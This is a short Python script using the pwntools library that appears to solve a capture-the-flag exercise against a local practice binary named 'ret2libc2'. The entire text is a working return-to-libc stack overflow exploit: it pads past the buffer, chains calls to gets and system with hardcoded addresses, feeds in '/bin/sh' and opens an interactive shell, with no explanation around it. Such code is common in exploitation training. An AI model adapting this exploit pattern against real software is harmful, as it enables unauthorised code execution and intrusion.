from pwn import *

bash = p32(0x0804A038)
sys = p32(0x08048490)
get = p32(0x08048460)
padding_len = 0x6c+4

payload = b'a'*padding_len + get + sys + bash + bash

sh = sh = process('./ret2libc2')
sh.sendline(payload)
sh.sendline(b'/bin/sh')
sh.interactive()
